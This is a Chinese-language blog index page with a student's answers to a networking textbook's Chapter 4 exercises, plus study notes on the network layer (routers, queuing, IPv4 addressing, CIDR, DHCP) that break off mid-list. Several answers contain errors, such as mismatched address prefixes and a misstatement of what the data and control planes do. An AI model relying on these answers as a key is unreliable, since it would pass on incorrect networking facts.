<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CoLin&#39;s BLOG">
<meta property="og:url" content="http://hornos3.github.com/page/8/index.html">
<meta property="og:site_name" content="CoLin&#39;s BLOG">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hornos3.github.com/page/8/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>CoLin's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's BLOG</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E7%AC%AC4%E7%AB%A0%E4%B9%A0%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E7%AC%AC4%E7%AB%A0%E4%B9%A0%E9%A2%98/" class="post-title-link" itemprop="url">计算机网络——第4章习题</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-03-02 23:48:47 / 修改时间：23:48:57" itemprop="dateCreated datePublished" datetime="2023-03-02T23:48:47+08:00">2023-03-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">计算机网络</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>3.5k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="课后习题和问题"><a class="markdownIt-Anchor" href="#课后习题和问题"></a> 课后习题和问题</h2>
<h3 id="41"><a class="markdownIt-Anchor" href="#41"></a> 4.1</h3>
<ol>
<li>网络层的分组名为数据报，路由器能够在网络层处理数据报，而链路层交换机只能在链路层处理链路层帧。</li>
<li>数据平面的主要功能是转发和路由，控制平面的主要功能是连接建立。</li>
<li>路由选择指的是路由器指定一条到目的主机的路由的过程，转发指的是路由器内部将输入端口的分组正确转移到指定的输出端口。</li>
<li>转发表中保存了若干个&lt;目标，端口&gt;数据对，便于路由器根据这些数据确定需要将数据报转发到哪一个端口。</li>
<li>因特网的网络层提供单一的服务，称为尽力而为服务。传送的分组既不能保证以它们发送的顺序被接收，也不能保证它们最终交付；既不能保证端到端时延，也不能保证有最小的带宽。</li>
</ol>
<h3 id="42"><a class="markdownIt-Anchor" href="#42"></a> 4.2</h3>
<ol start="6">
<li>输入端口、输出端口、交换端口由硬件实现，其数据表处理功能比软件快很多；路由选择处理器由软件实现，维护路由表以及其他的路由信息，并计算转发表。数据平面使用硬件实现，控制平面使用软件实现。</li>
<li>在高速路由器的输入端口存储转发表的副本可以大大减少路由器进行路由选择的时间，无需每一次都计算一次路径。转发决策能在每个输入端口本地做出，无须基于每个分组调用集中式路由选择处理器，因此避免了集中式处理的瓶颈。</li>
<li>基于目的地转发意味着路由器仅会根据数据报的目的IP地址来决定转发端口，通用转发除了数据报的最终目的地之外还有其他的影响因素，如转发决策可以基于数据报的TCP/UDP源端口号和目的端口号进行转发。</li>
<li>使用最长前缀匹配原则来确定应该转发到哪一个端口。</li>
<li>经过内存交换：在输入端口与输出端口之间的交换是在CPU的直接控制之下完成的，一个分组到达一个输入端口时，该端口会通过中断方式向路由选择处理器发出信号，该分组从输入端口处被复制到处理器内存中，理由选择处理器提取目的地址，在转发表中查找到适当的转发端口，并将该分组复制到输出端口的缓存中。<br />
经过总线交换：输入端口经过一条共享总线将分组直接传送到输出端口，不需要路由选择处理器的干预。让输入端口为分组预先计划一个交换机内部标签，指示本地输出端口，使分组在总线上传送和传输到输出端口。该分组能够由所有输出端口收到，但只有与该标签匹配的端口才能保存该分组。<br />
经互联网络交换：使用一个更为复杂的互联网络，如纵横式交换机结构，每条垂直的总线在交叉点与每条水平的总线交叉，交叉点通过交换结构控制器能够在任何时候开启和闭合。当分组到达端口A需要转发到Y时，交换机控制器闭合A和Y总线交叉部分的交叉点，然后即可转发。只有互联网络交换可以并行交换多个分组。</li>
<li>如果数据报到达的速率大于数据报处理的速率，当输入端口的数据报缓存满时，后面到达的数据报就可能会丢失。加快路由器处理器的处理速率即可消除排队。</li>
<li>如果数据报被大量送入输入端口，速率大于转发速率时，会导致输出端口排队，到达一定程度后出现丢失。无法防止这种丢失。</li>
<li>HOL阻塞，即线头阻塞，即在一个输入端口的缓存中，后面的分组由于前面的分组等待转移到输出端口而产生等待时延的现象，又称线路前部阻塞。出现于输入端口。</li>
<li>FIFO</li>
<li>不同的数据报中的数据的重要程度不同，对时延的要求也不同，因此需要为分组设置优先权。</li>
<li>RR指循环排队原则，WFQ指加权公平排队原则，二者的基本差异是RR将所有类通信都一视同仁地看待，而WFQ则将通信分为多个不同优先权的分组，优先权表现在一个循环周期内某一类分组处理的时间比例。当WFQ中所有类具有相同的服务权重时，与RR相同。</li>
</ol>
<h3 id="43"><a class="markdownIt-Anchor" href="#43"></a> 4.3</h3>
<ol start="17">
<li>IP数据报首部中含有上层协议字段，可用于标识上层协议。</li>
<li>TTL（time to live），每一次转发都会减1，当该值被减为0时即丢弃。</li>
<li>不用，IP数据报只检验其头部信息。</li>
<li>当数据报中数据部分的长度大于MTU，即链路的最大传送单元时，需要对数据报进行分割，较小的数据报在最终目的主机装配。</li>
<li>路由器有IP地址，有多个IP地址，数量等于其有效接口数量。</li>
<li>11011111  00000001  00000011  00011011</li>
<li>略</li>
<li>8个接口，3个</li>
<li>IP数据报头部20字节，TCP报文段头部20字节，一个数据报中头部信息占40字节，还有40字节为数据，因此开销为50%，即发送的内容只有1-50%是有效数据，应用数据所占百分比为50%</li>
<li>通过路由器的DHCP服务器为5台PC分配IP地址，该无线路由器使用NAT，因为ISP只给了它一个IP地址，它必须自己构建一个局域网。</li>
<li>路由聚合指使用单个网络前缀通告多个网络的能力，其使用一个具有公共前缀的地址来汇聚许多的子网。</li>
<li>能够自动配置主机的IP地址。</li>
<li>专用网络地址指在各个子网中可以重复使用的网络IP地址。具有专用网络地址的数据报不会出现在大型公共因特网中，否则数据报将无法确定到底应该发送到哪一台主机。</li>
<li>有，如源IP和目的IP。</li>
<li>是，因为IPv6载荷包裹在IPv4数据报中。</li>
</ol>
<h2 id="习题"><a class="markdownIt-Anchor" href="#习题"></a> 习题</h2>
<ol>
<li>a. 路由器A的转发表：其中1项的目的地址为H3，转发端口为3。<br />
b. 无法实现，因为路由器转发仅根据目的地址转发，而不根据数据来源转发。</li>
<li>a. 不能，因为交换结构是共享总线时，一次只能转发一个分组。<br />
b. 不能，因为交换结构是内存交换时，一次也只能转发一个分组。<br />
c. 不能，因为两个分组转发到相同的输出端口，交换结构为纵横式时，允许不同端口同时转发不同分组，但一个端口在一个时刻不能同时转发多个分组。</li>
<li>内存和总线交换结构：每一次只能转发一个分组，因此最大时延为(n-1)D。纵横式：不同端口的输出可以交互进行，因此最大时延为0。</li>
<li>在第一个时隙，第一个输入端口的X分组到达X输出端口，另外剩余两个端口的最前两个Y分组选择一个到达Y输出端口，之后的分组还需要两个时隙完成传输，故最少需要3个时隙。最大也是3个时隙。</li>
<li>a.<br />
目的地址为192.0.0.0/10时输出到0端口，前缀11100000 00<br />
目的地址为192.64.0.0/16时输出到1端口，前缀11100000 01000000<br />
目的地址为192.0.0.0/7且不属于端口0、1的地址范围时输出到2端口，前缀1110000<br />
其余输出到3端口<br />
b. 第一个地址根据最长前缀匹配原则匹配到其他，输出到3端口<br />
第二个地址可匹配端口2，且不匹配端口0、1，输出到2端口<br />
第三个地址匹配到其他，输出到3端口</li>
<li>首先看前缀长的。<br />
接口1前缀010，匹配64~95，地址数量为32。<br />
接口2前缀011，匹配96~127，地址数量为32。<br />
接口0前缀00，匹配0~63，地址数量为64。<br />
接口2前缀10，匹配128~191，地址数量为64。<br />
接口2可匹配96~191，地址数量为96。<br />
接口3前缀11，匹配192~255，地址数量为64。</li>
<li>首先看前缀长的。<br />
接口2前缀111，匹配224~255，地址数量为32。<br />
接口1前缀10，匹配128~191，地址数量为64。<br />
接口0前缀1，匹配192~223，地址数量为32。<br />
接口3匹配0~127，地址数量为128。</li>
<li>首先分配需求大的子网，子网2分配一个25地址，即223.1.17.0/25，子网1分配一个26地址，即223.1.17.128/26，子网3分配剩余地址，即223.1.17.192/26。</li>
<li>略</li>
<li></li>
</ol>
<p>244.0.0.0/10 → 端口0<br />
224.64.0.0/16 → 端口1<br />
224.0.0.0/7 → 端口2<br />
0.0.0.0/0 → 端口3</p>
<ol start="11">
<li>128.119.40.(64\80\96\112)/28</li>
<li>子网1：214.97.254.0/24<br />
子网2：214.97.255.0/25 - 214.97.255.0/29<br />
子网3：214.97.255.128/25<br />
子网4：214.97.255.0/31<br />
子网5：214.97.255.2/31<br />
子网6：214.97.255.4/30</li>
<li>略</li>
<li>将会产生4个分片，表示均为422，偏移分别为0、85、170、255，前3个分片的MF为1，数据量700字节，最后一个为0，数据量300字节。</li>
<li>5MB=5×10<sup>6</sup>字节，首部字段的长度为40字节（含IP首部和TCP首部），故每个数据报最大数据量为1460字节，需要将5MB分为3425个数据报。</li>
<li>a. 192.168.1.1~192.168.1.3<br />
b. 源IP地址：192.168.1.1，端口3345；转换IP地址：24.34.112.235，端口4000。其余5个类似。</li>
<li>a. 通过标识号识别，由于每一台主机的标识号都是连号的，可以将所有的分组编号提取出来，检测其中连号或单号的数量，可以大致检测出主机的数量，通过这样的方式检测出的主机数量不会大于实际的主机数量，因为不同主机在不同的时间段可能会使用同一个编号。<br />
b. 不能。这样就无法通过标识号的规律对数据报进行源关联。</li>
<li>不可能设计这种技术。TCP首先需要创建一个连接，一方通过NAT地址转换可以找到另一方NAT的网关，但不能定位到NAT内部子网的另一方。</li>
<li>略</li>
<li>略</li>
<li>略</li>
<li>略</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E7%AC%AC4,5%E7%AB%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E7%AC%AC4,5%E7%AB%A0/" class="post-title-link" itemprop="url">计算机网络——第4,5章</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-03-02 23:47:13 / 修改时间：23:48:42" itemprop="dateCreated datePublished" datetime="2023-03-02T23:47:13+08:00">2023-03-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">计算机网络</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>9.6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>9 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="chapter-4-网络层数据平面"><a class="markdownIt-Anchor" href="#chapter-4-网络层数据平面"></a> Chapter 4 网络层——数据平面</h1>
<h2 id="41-网络层概述"><a class="markdownIt-Anchor" href="#41-网络层概述"></a> 4.1 网络层概述</h2>
<p><font color=red>网络层的任务：完成主机到主机之间的通信</font></p>
<p>网络层是五层架构中的第三层，为运输层（进程之间的通信）提供支持。</p>
<p>为实现从源主机到目标主机成功的移动数据分组，整个路径上每一台分组交换机上均需要实现网络层，才能实现通信。</p>
<p>网络层功能：</p>
<ul>
<li>在全局范围内对主机通信进行选路，结果反映为分组交换机上的转发表（理解为每一台设备尝试获取整个网络的拓扑结构，控制层面）</li>
<li>分组交换机上的网络层根据转发表以及分组头部信息，将分组向合适的链路进行转发（数据层面）</li>
<li>对于面向连接的网络层服务，提供连接建立的功能</li>
</ul>
<p>分组交换机分类：</p>
<ul>
<li>根据链路层首部信息进行转发的——链路层结点交换机</li>
<li>根据网络层首部信息进行转发的——路由器</li>
</ul>
<p><font color=red>注意：链路层结点交换机和路由器的区别的理解：链路层在网络层之下，通过以太网（Ethernet）协议工作，链路层结点交换机根据MAC地址找到主机，而路由器通过IP地址找到主机。在一个内网之中，可能存在有多个交换机，交换机在内网主机之间的通信效率高于路由器（主机与路由器直接相连也可以实现交换机的功能，但效率不如交换机）。</font>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/baidu_32045201/article/details/78305586?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166865182216800184174368%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=166865182216800184174368&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-78305586-null-null.142%5Ev63%5Econtrol,201%5Ev3%5Econtrol_1,213%5Ev2%5Et3_esquery_v1&amp;utm_term=%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%92%8C%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E5%8C%BA%E5%88%AB&amp;spm=1018.2226.3001.4187">路由器与交换机的区别与联系_WhataNerd的博客-CSDN博客_交换机和路由器的区别</a></p>
<p>网络层可能提供的服务：</p>
<ul>
<li>确保交付：确保分组最终到达目的地（与以太网协议不同，以太网协议为尽力传输）</li>
<li>具有时延上界的确保交付：在时延上限以内交付</li>
<li>有序分组交付：以发送顺序到达</li>
<li>确保最小带宽：以低于特定比特率速率传输时分组不会丢失而且在时延内可达</li>
<li>确保最大时延抖动：连续分组间隔时间不超过特定值</li>
<li>安全性服务：机密性、完整性和源鉴别（如TLS）</li>
</ul>
<p>网络层提供的服务可以分为：（下面两种只能提供一种，而运输层可通知提供两种）</p>
<ul>
<li>面向有连接的服务：虚电路，需要事先握手</li>
<li>面向无连接的服务：数据报，不需事先握手</li>
</ul>
<p><font color=red>网络层与运输层中相应服务的区别</font>：</p>
<ul>
<li>网络层是向运输层提供主机到主机的服务，而运输层是向应用层提供进程到进程的服务。</li>
<li>网络层仅提供上述两种服务中的一种，不同时提供两种，而运输层则同时提供两种。</li>
<li>运输层的服务在网络边缘的端系统中实现，而网络层的服务则在整个网络中实现，含路由器。</li>
</ul>
<h4 id="虚电路网络"><a class="markdownIt-Anchor" href="#虚电路网络"></a> 虚电路网络</h4>
<p>虚电路的目标是使首发双方之间的路径表现得如同电话线路一般。<br />
工作机制：</p>
<ul>
<li>数据开始流动之前，呼叫建立，流动结束后要断开</li>
<li>每一个分组携带虚电路的标识（而不是目的主机的地址）</li>
<li>路径上的每一个路由器必须为进行中的连接维持连接状态信息</li>
<li>链路，路由器资源可以分配给虚电路，为了达到类似线路交换的性能</li>
</ul>
<p>虚电路的组成：</p>
<ul>
<li>从源到目的主机的路径，含有一系列链路和路由器</li>
<li>VC号，沿着该路径的每段链路的一个号码
<ul>
<li>一条虚电路在每条链路上具有不同的VC号</li>
<li>每台中间路由器必须用一个新的VC号替代每个传输分组的VC号</li>
</ul>
</li>
<li>沿着该路径的每台路由器中的转发表
<ul>
<li>创建一条新的虚电路，转发表增加一个新表项</li>
<li>终止一条虚电路，表中相应项被删除</li>
</ul>
</li>
</ul>
<h4 id="数据报网络"><a class="markdownIt-Anchor" href="#数据报网络"></a> 数据报网络</h4>
<p>数据报网络在网络层没有连接建立过程。路由器在端到端的连接中不维护连接状态信息（在网络层不存在“连接”的概念）。传输报文时使用目的主机地址信息，同一对主机之间的报文可能会走不同的路径。</p>
<p>虚电路网络与数据报网络的对比：虚电路网络将重点放在网络，数据报网络将重点放在终端。数据报网络互联不同类型的网络更加容易，启用新服务的速度更快更简单。</p>
<h2 id="42-路由器工作原理"><a class="markdownIt-Anchor" href="#42-路由器工作原理"></a> 4.2 路由器工作原理</h2>
<p>路由器关键组成：</p>
<ul>
<li>运行路由算法/协议（如RIP选路算法）</li>
<li>从入口到出口的转发</li>
</ul>
<p><font color=red>路由器的分散式交换：</font></p>
<ul>
<li>按照给定的目标地址，使用输入端口内存中存储的路由表，查找输出端口</li>
<li>路由器需要以“线路速度”完成输入输出端口的处理</li>
<li>如果数据报到达的速度超过了输入输出端口将数据报转交给交换结构的速度，则会产生排队现象。
<ul>
<li>基于目标的转发：仅基于目标IP地址的转发，以<font color=red>最长前缀匹配方法</font>确定向何处转发。</li>
<li>通用转发：基于任意首部字段值转发</li>
</ul>
</li>
</ul>
<h3 id="输入端口"><a class="markdownIt-Anchor" href="#输入端口"></a> 输入端口</h3>
<p>输入端口排队：</p>
<ul>
<li>输入端口处理速率超过交换结构速率时产生</li>
<li>当输入缓冲区溢出时可能会导致排队丢包和时延</li>
<li><font color=red>线头阻塞</font>：在输入队列中排队的分组必须等待通过交换结构发送，因为它被位于线头的另一个分组阻塞了。</li>
</ul>
<p>交换结构工作原理：</p>
<ul>
<li>经总线交换：输入端口通过一根共享总线直接传送到输出端口，缺点是<font color=red>总线的带宽是交换速度的瓶颈</font>。一次处理一个分组。</li>
<li>经内联网络：将长度变化的IP分组分片为固定尺寸的信元，通过交换结构对信元进行转发。克服了总线带宽的限制。</li>
<li>经内存交换：在输入端口和输出端口之间的交换是在CPU的直接控制下完成的。分组被拷贝到系统内存中，CPU提出报头中的目标地址，查找路由表中的输出接口，将数据包拷贝到输出接口。其转发速度受限于内存的带宽（吞吐量&lt;带宽/2），一次转发一个分组。</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/2cd2649418ff4561b35808c705a039e2.png" alt="" /></p>
<h3 id="输出端口"><a class="markdownIt-Anchor" href="#输出端口"></a> 输出端口</h3>
<p>输出端口需要缓存管理和调度原则。当交换结构将分组交付给输出端口的速率超过输出链路速率时进行缓存管理，在数据报队列中选择数据报进行传输时需要调度原则。</p>
<p>输出端口排队：</p>
<ul>
<li>当通过交换结构到达的分组速率超过输出链路速率时产生。</li>
<li>需要对分组进行缓存，超过缓存缓冲区大小会造成排队和丢包。</li>
</ul>
<h3 id="拥塞问题的解决方法"><a class="markdownIt-Anchor" href="#拥塞问题的解决方法"></a> 拥塞问题的解决方法</h3>
<p>缓冲区设置问题：</p>
<ul>
<li>经过试验认为对于有N条TCP连接经过的链路而言，缓冲区大小应为：$$B=\frac{\operatorname{RTT}\times R}{\sqrt{N}}$$其中R为带宽，RTT为往返时间。</li>
</ul>
<p>输出端口分组调度策略：</p>
<ul>
<li>先来先服务策略（First Come First Serve，FIFO的队列策略）
<ul>
<li>当缓冲区满时，有几种丢弃方法：
<ul>
<li>尾部丢弃</li>
<li>按照优先级丢弃</li>
<li>随机丢弃</li>
</ul>
</li>
</ul>
</li>
<li>优先级排队策略
<ul>
<li>针对高优先级和低优先级的数据报创建多个不同队列</li>
</ul>
</li>
<li>循环调度策略
<ul>
<li>循环扫描不同类的队列，轮流发送数据包</li>
</ul>
</li>
<li>加权公平队列策略
<ul>
<li>每一个类赋予对应的权重，在一个周期之内可以获得一定数量的服务，既可以保证高优先级队列获得最大优先权，又可以防止低优先级队列等待时间过长。</li>
</ul>
</li>
</ul>
<p>分组丢弃策略</p>
<ul>
<li>被动策略
<ul>
<li>丢弃尾部</li>
<li>随机丢弃已排队分组</li>
</ul>
</li>
<li>主动策略
<ul>
<li>随时计算平均队列长度，并设置一个最小和最大阈值。</li>
<li>当队列长度小于最小阈值时，无条件允许分组入队列。</li>
<li>当队列长度大于最大阈值时，无条件禁止分组入队列。</li>
<li>当队列长度在两个阈值之间时，按照概率标记或丢弃分组。</li>
</ul>
</li>
</ul>
<h2 id="43-网际协议"><a class="markdownIt-Anchor" href="#43-网际协议"></a> 4.3 网际协议</h2>
<p><font color=red><strong>IPv4协议数据报格式：</strong></font><br />
<img src="https://img-blog.csdnimg.cn/4d9498e0c9024f3a908ffc12db15464f.jpeg#pic_center" alt="" /></p>
<h3 id="ip分片和重组"><a class="markdownIt-Anchor" href="#ip分片和重组"></a> IP分片和重组</h3>
<p>MTU：最大传送单元，一个网络层数据包的最大长度（包含网络层协议头）</p>
<p>受限于MTU，大的数据包在一些链路中会被拆分为多个数据包。<font color=red>网络中的交换机都有可能会拆分数据包，但只有目标主机会对数据包进行重组，具有较大MTU的链路即使接收到小数据包也不会进行重组。</font> 重组后由于数据包头部数量增加，因此总的传输的字节数量会增加。</p>
<p><font color=red><strong>IP地址</strong></font></p>
<ul>
<li>结构：网络号（子网号）+主机号，在同一个网络下的主机和路由器的IP地址中的网络号必须相同，同一网络下的主机可以直接通信。</li>
<li>接口：连接主机、路由器之间的物理链路，一般路由器有多个接口，主机也有可能有多个接口，IP地址只和接口有关而与主机、路由器没有太多关联。</li>
<li>传统形式下的IP地址分类：
<ul>
<li>A类：0.0.0.0~127.255.255.255，网络号7位，主机号24位</li>
<li>B类：128.0.0.0~191.255.255.255，网络号14位，主机号16位</li>
<li>C类：192.0.0.0~223.255.255.255，网络号21位，主机号8位</li>
<li>D类：224.0.0.0~239.255.255.255，组播地址</li>
<li>E类：240.0.0.0~255.255.255.255，保留</li>
</ul>
</li>
<li>路由器的IP地址：为完成分组转发功能，路由器至少拥有两个IP地址，接入不同的子网之中，用于不同子网之间的通信。</li>
<li>子网划分方法：在主机号中借用一部分位数作为子网号</li>
<li>子网掩码：对内用于指示网络号和子网号的位置，对外可以隐藏子网的存在。获得方法：通过在网络号的子网号相应的位置全部置为1，主机号相应的位置全部置为0，即可得到子网掩码。</li>
<li>在同一个局域网上的主机或路由器的IP地址中的网络号必须是一样的，图中的网络号就是IP地址中的net-id。路由器总是具有两个或两个以上的IP地址，路由器的每一个接口都有一个不同网络号的IP地址。</li>
</ul>
<h3 id="ipv4编址"><a class="markdownIt-Anchor" href="#ipv4编址"></a> IPv4编址</h3>
<p>网络地址=IP地址 逻辑与 子网掩码。<br />
采用子网掩码之后，路由器的寻址过程将演变为一个两级寻址过程：</p>
<ul>
<li>检查分组目的IP地址中的网络号，若网络号不是本网络，则从路由表中找出相应的的转发节点地址将其转发出去。</li>
<li>检查子网号：当网络号是本网络时，路由器将检查子网号，向相应的子网转发此分组。</li>
</ul>
<p>IP地址扩展：构造超网，从网络号中借用一部分位数作为主机号。</p>
<h4 id="cidr"><a class="markdownIt-Anchor" href="#cidr"></a> CIDR</h4>
<p>无类别域间路由选择。应用于地址空间的利用率低，地址空间面临耗尽时。</p>
<p>编址格式：IP地址::={网络前缀，主机号}<br />
斜线记法：192.168.0.1/24<br />
简写记法：10.0.0.0/10可以简写为10/10</p>
<p>最长前缀匹配：</p>
<ul>
<li>使用CIDR时，路由表中的每一个项目由“网络前缀”和“下一条地址”组成，在查找路由表时可能会得到不止一个匹配结果。</li>
<li>应当从匹配结果中选择具有最长网络前缀的路由：最长前缀匹配。</li>
<li>网络前缀越长，其地址块就越小，因而路由就越具体。</li>
<li>最长前缀匹配又被称为最长匹配或最佳匹配。</li>
</ul>
<p>主机获得IP地址的方法：手工配置，或使用DHCP协议动态获取。</p>
<h4 id="dhcp动态主机配置协议"><a class="markdownIt-Anchor" href="#dhcp动态主机配置协议"></a> DHCP：动态主机配置协议</h4>
<p>允许主机在加入网络时动态地从网络服务器中获取其网络地址。</p>
<ul>
<li>能够在使用过程中更新地址</li>
<li>允许地址重用</li>
<li>支持移动用户</li>
</ul>
<p>主要流程</p>
<ul>
<li>主机广播DHCP发现报文。</li>
